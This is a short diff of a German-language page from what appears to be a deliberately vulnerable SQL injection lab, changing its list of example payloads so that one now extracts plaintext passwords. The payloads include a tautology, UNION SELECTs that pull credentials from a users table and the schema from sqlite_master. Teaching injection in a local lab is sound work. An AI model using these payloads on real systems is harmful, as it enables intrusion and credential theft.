@@ -32,8 +32,8 @@
     <summary>Beispiel-Payloads (nur gegen diese lokale Lab-App)</summary>
     <ul>
       <li><code>%' OR '1'='1</code> → listet alle User</li>
-      <li><code>%' UNION SELECT username, password_hash FROM users --</code>
-          → zieht Benutzernamen + Passwort-Hashes in die Ergebnis-Spalten</li>
+      <li><code>%' UNION SELECT username, password FROM users --</code>
+          → zieht Benutzernamen + Klartext-Passwoerter in die Ergebnis-Spalten</li>
       <li><code>x%' UNION SELECT sql, name FROM sqlite_master --</code>
           → Schema (Tabellen-DDL) auslesen</li>
     </ul>
